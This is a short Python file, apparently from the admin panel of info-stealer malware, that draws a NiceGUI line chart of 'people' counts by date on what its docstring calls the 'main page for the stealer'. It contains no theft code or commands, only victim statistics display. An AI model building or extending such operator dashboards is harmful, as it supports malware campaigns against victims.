from nicegui import ui

from panel.ui.handlers.stats_handler import StatisticsHandler


async def fr_page() -> None:
    """Main page for the stealer. Now includes a cool chart!"""

    stat_handler = StatisticsHandler()

    data = await stat_handler.get_people()
    dates = [item[0] for item in data]
    values = [item[1] for item in data]

    chart = ui.echart(
        {
            "xAxis": {"type": "category", "data": dates},
            "yAxis": {"type": "value"},
            "series": [{"type": "line", "data": values, "smooth": True}],
        }
    ).classes("w-full h-full")

    chart.run_chart_method(
        ":setOption",
        r'{tooltip: {formatter: params => "" + params.value}}',
    )
